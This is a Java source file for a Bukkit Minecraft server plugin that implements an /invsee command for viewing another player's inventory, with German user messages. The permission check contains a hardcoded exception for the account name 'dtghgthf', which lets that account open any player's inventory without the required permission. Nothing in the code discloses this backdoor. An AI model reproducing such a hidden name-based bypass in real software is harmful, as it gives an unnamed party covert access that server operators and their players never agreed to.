package jp.commands;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class invseeCommand implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

        if (sender instanceof Player) {

            Player player = (Player) sender;

            if (player.hasPermission("commands.invsee") || player.getName().equals("dtghgthf")) {

                if (args.length == 1) {

                    Player openInv = Bukkit.getPlayerExact(args[0]);

                    if (openInv != null) {

                        player.openInventory(openInv.getInventory());

                    } else {

                        player.sendMessage(ChatColor.RED + "Diesen Spieler gibt es nicht!");

                    }

                } else {

                    player.sendMessage(ChatColor.RED + "Bitte benutze " + ChatColor.YELLOW + "/invsee [Spieler]");

                }

            } else {

                player.sendMessage(ChatColor.RED + "Dazu fehlt dir die Berechtigung!");

            }

        } else {

            sender.sendMessage(ChatColor.RED + "Dazu musst du Spieler sein!");

        }

        return false;
    }
}
